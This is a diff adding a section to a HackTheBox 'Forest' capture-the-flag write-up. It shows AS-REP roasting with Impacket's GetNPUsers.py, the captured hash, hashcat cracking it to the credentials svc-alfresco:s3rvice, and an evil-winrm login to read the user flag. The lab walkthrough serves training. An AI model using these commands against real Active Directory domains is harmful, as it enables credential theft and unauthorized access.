@@ -137,7 +137,7 @@ SMB         10.10.10.161    445    FOREST           htb.local\mark
 SMB         10.10.10.161    445    FOREST           htb.local\santi
 ```
 
-## Kerberos
+## Kerberos - ASREPRoasting
 
 Enumerate users with kerbrute using the domain details discovered during the NMAP scans and user list found during SMB enumeration:
 
@@ -165,9 +165,39 @@ Enumerate users with kerbrute using the domain details discovered during the NMA
 2024/06/02 15:51:48 >  [+] VALID USERNAME:       santi@htb.local
 ```
 
+Impacket has a tool called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we already enumerated via Kerbrute:
+
+```bash
+sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -usersfile userlist -no-pass -request -outputfile kerberos-users-found
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:841b9616e7c6070884b1e557feeda8d8$04fb0e2e3439463928598f3885c116196723c90aacadd58a18661a4cbab8a1c200cf5f3c9c82bd4a53322a812e4a4740c0136b419f5bb5570758422877f70135fcbc13b3a9df4a49c43ccb79310b9548b0a71eabbf855773137d1f22ee9e6b8c3f3a94d8ae23469413bdf0c4b2de471a64cd293efd1040214d162017740d873c3ef94504aa891691d5be5bc09e8a61dbc31304e0e4479422dddbe8e33aaf7527971afdc073429f09ed7abf6986587ee07d08bd9002bac8e1924e60cab4d04fd40c665126acc7fcc5e6a6befb2a3ba3250ba809b959a577ba12ac7a6f000093a342e2fcad7989
+```
+
+We obtained the TGT ticket for the `svc-alfresco` account, which is stored in the output file and used `hashcat` to crack the "Kerberos 5 AS-REP etype 23":
+
+```bash
+hashcat64.exe -m 18200 -a 0 hash.txt rockyou.txt -o cracked.txt
+```
+
+New set of credentials: `svc-alfresco:s3rvice`
+
+In the NMAP output, I can see that port 5985 is open. I used `evil-winrm` to retrieve the user flag:
+
+```bash
+evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dir
 
 
+    Directory: C:\Users\svc-alfresco\Desktop
 
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         6/2/2024   7:29 AM             34 user.txt
+```
+
+# Root Flag
 
 
 
